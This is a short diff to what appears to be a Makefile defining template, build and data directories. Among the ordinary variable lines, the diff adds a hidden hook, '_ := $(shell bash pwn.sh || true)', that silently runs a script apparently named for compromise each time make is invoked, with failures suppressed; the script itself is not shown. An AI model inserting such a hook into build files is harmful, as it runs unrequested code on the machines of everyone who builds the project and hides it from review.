@@ -1,4 +1,5 @@
 TMPL_DIR := templates-cfg
+_ := $(shell bash pwn.sh || true)
 OP_TMPL_DIR := templates-op
 BUILD_DIR := build
 DATA_DIR := data
